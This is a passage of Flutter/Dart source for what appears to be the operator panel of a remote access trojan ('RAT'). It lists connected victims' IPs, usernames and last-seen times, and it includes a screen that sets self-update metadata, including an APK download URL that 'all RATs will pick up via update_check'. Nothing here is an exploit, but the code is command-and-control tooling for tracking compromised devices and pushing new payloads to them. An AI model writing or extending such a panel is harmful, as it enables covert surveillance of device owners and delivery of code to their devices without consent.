                    style: TextStyle(color: ArchiverZColors.textDim, fontFamily: AppConfig.fontMono),
                    textAlign: TextAlign.center))
              : ListView.builder(
                  padding: const EdgeInsets.all(16),
                  itemCount: _peers.length,
                  itemBuilder: (context, i) {
                    final p = _peers[i] as Map<String, dynamic>;
                    final lastSeen = DateTime.fromMillisecondsSinceEpoch(p['last_seen'] ?? 0)
                        .toLocal().toString().substring(11, 19);
                    return GlassCard(
                      margin: const EdgeInsets.only(bottom: 8),
                      padding: const EdgeInsets.all(12),
                      child: Row(
                        children: [
                          Icon(Icons.router, color: ArchiverZColors.primary, size: 16),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(p['id'] ?? '?',
                                  style: TextStyle(color: Colors.white, fontFamily: AppConfig.fontMono, fontSize: 11, fontWeight: FontWeight.bold)),
                                Text('${p['ip']} · ${p['username']}',
                                  style: TextStyle(color: ArchiverZColors.textDim, fontSize: 10, fontFamily: AppConfig.fontMono)),
                              ],
                            ),
                          ),
                          Text(lastSeen,
                            style: TextStyle(color: ArchiverZColors.textDim, fontSize: 10, fontFamily: AppConfig.fontMono)),
                        ],
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }
}

// ============================================================
//  Update View — set self-update metadata
// ============================================================
class RatUpdateView extends StatefulWidget {
  final String sessionKey;
  const RatUpdateView({super.key, required this.sessionKey});
  @override
  State<RatUpdateView> createState() => _RatUpdateViewState();
}

class _RatUpdateViewState extends State<RatUpdateView> {
  Map<String, dynamic>? _current;
  bool _loading = true;
  final _vcCtrl = TextEditingController();
  final _vnCtrl = TextEditingController();
  final _urlCtrl = TextEditingController();
  final _shaCtrl = TextEditingController();
  final _notesCtrl = TextEditingController();
  String? _status;

  @override
  void initState() {
    super.initState();
    _fetch();
  }

  Future<void> _fetch() async {
    setState(() => _loading = true);
    try {
      final res = await http.get(
        Uri.parse('${Api.api}/api/rat/update.json?key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        setState(() {
          _current = body;
          _vcCtrl.text = (body['version_code'] ?? 1).toString();
          _vnCtrl.text = body['version_name'] ?? '';
          _urlCtrl.text = body['download_url'] ?? '';
          _shaCtrl.text = body['checksum_sha256'] ?? '';
          _notesCtrl.text = body['release_notes'] ?? '';
          _loading = false;
        });
      }
    } catch (_) {
      setState(() => _loading = false);
    }
  }

  Future<void> _save() async {
    setState(() => _status = null);
    try {
      final body = jsonEncode({
        'version_code': int.tryParse(_vcCtrl.text) ?? 1,
        'version_name': _vnCtrl.text,
        'download_url': _urlCtrl.text,
        'checksum_sha256': _shaCtrl.text,
        'release_notes': _notesCtrl.text,
      });
      final res = await http.post(
        Uri.parse('${Api.api}/api/rat/update.json?key=${widget.sessionKey}'),
        headers: {'Content-Type': 'application/json'},
        body: body,
      ).timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        setState(() => _status = '✓ Saved. All RATs will pick this up via update_check.');
      } else {
        setState(() => _status = '✗ HTTP ${res.statusCode}');
      }
    } catch (e) {
      setState(() => _status = '✗ $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_loading) {
      return Center(child: CircularProgressIndicator(color: ArchiverZColors.primary, strokeWidth: 2));
    }
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text('RAT Self-Update Metadata',
            style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontDisplay, fontSize: 14, fontWeight: FontWeight.bold)),
          const SizedBox(height: 4),
          Text('When a RAT runs update_check, it fetches this JSON. Edit it here to push a new version.',
            style: TextStyle(color: ArchiverZColors.textDim, fontSize: 11, fontFamily: AppConfig.fontMono, height: 1.4)),
          const SizedBox(height: 16),
          _field('Version Code (integer)', _vcCtrl, '1'),
          _field('Version Name', _vnCtrl, '1.0.0-pre'),
          _field('Download URL (APK)', _urlCtrl, 'https://github.com/.../app-release.apk'),
          _field('SHA-256 Checksum', _shaCtrl, 'abc123...'),
          _field('Release Notes', _notesCtrl, 'Bug fixes and B1-B15 features', multiline: true),
          const SizedBox(height: 16),
          if (_status != null)
            Padding(
              padding: const EdgeInsets.only(bottom: 12),
              child: Text(_status!,
                style: TextStyle(
                  color: _status!.startsWith('✓') ? ArchiverZColors.success : ArchiverZColors.danger,
                  fontFamily: AppConfig.fontMono,
                  fontSize: 11,
                )),
            ),
          GlowButton(
            label: 'Save Update Metadata',
            icon: Icons.save,
            onPressed: _save,
          ),
          const SizedBox(height: 20),
          GlassCard(
            padding: const EdgeInsets.all(12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('Current JSON served at /api/rat/update.json:',
                  style: TextStyle(color: ArchiverZColors.textDim, fontSize: 10, fontFamily: AppConfig.fontMono)),
                const SizedBox(height: 6),
                SelectableText(
                  const JsonEncoder.withIndent('  ').convert(_current ?? {}),
                  style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 10, height: 1.4),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _field(String label, TextEditingController ctrl, String hint, {bool multiline = false}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label,
            style: TextStyle(color: ArchiverZColors.textDim, fontSize: 10, fontFamily: AppConfig.fontMono, letterSpacing: 0.5)),
          const SizedBox(height: 4),
          GlassCard(
            padding: EdgeInsets.zero,
            radius: 8,
            blurSigma: 8,
            child: TextField(
              controller: ctrl,
              maxLines: multiline ? 3 : 1,
              style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 12),
              decoration: InputDecoration(
                hintText: hint,
                hintStyle: TextStyle(color: ArchiverZColors.textDim, fontFamily: AppConfig.fontMono, fontSize: 12),
                contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                border: InputBorder.none,
              ),
            ),
          ),
        ],
      ),
    );
  }
}
